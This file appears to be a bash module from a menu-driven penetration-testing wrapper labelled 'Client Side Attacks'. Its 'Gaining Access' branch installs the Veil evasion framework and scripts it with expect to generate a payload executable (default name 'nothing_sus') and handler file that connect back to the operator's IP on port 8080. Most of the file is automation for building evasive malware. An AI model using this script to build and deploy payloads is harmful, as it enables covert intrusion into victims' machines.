#!/usr/bin/env bash
source main.sh
folder="custom_scripts/$current"
current="Client Side Attacks"
ready
# END OF BOILER (DO NOT REMOVE OR MODIFY ABOVE CODE)
    


selectOptions "Client Side Attacks" "Selection" "Try another selection" "Gaining Access" "Social Engineering"
if [[ "$SO" == "1" ]]; then   # Gaining Access
  installPackages veil
  :
  selectOptions "Setup Type" "Selection" "Try another selection" "Express" "Custom"
  if [[ $SO == "1" ]]; then # express
    :
  else #custom  
    # get all required inputs
    getInput "Base Name" "Select a base name for output files." "nothing_sus"
    NAME=$SI
    # getInput "Localhost IP" "Type your LHOST IP" "191.330.165.7"
    # LHOST=$SI

    # auto-run and set options
    expect -c '
    set timeout -1
    spawn "veil"
    expect ">: "
    send -- "update\r"
    send -- "\r"
    expect ">: "
    send -- "use 1\r"
    expect ">: "
    send -- "use 15\r"
    expect "]: "
    send -- "set LHOST '$IP'\r"
    expect "]: "
    send -- "set LPORT 8080\r"
    expect "]: "
    send -- "set PROCESSORS 1\r"
    expect "]: "
    send -- "set SLEEP 4\r"
    expect "]: "

    send -- "generate\r"
    expect ": "
    send -- "'$NAME'\r"
    expect "..."
    send -- "\r"
    expect ">: "
    send -- "exit\r"
    '
    mkdir "output/$NAME/"
    mv "$(find / -name ${NAME}.exe)" "output/$NAME/"
    mv "$(find / -name ${NAME}.rc)" "output/$NAME/"
    sleep 5
  fi
    
elif [[ "$SO" == "2" ]]; then # Social Engineering
  :
fi
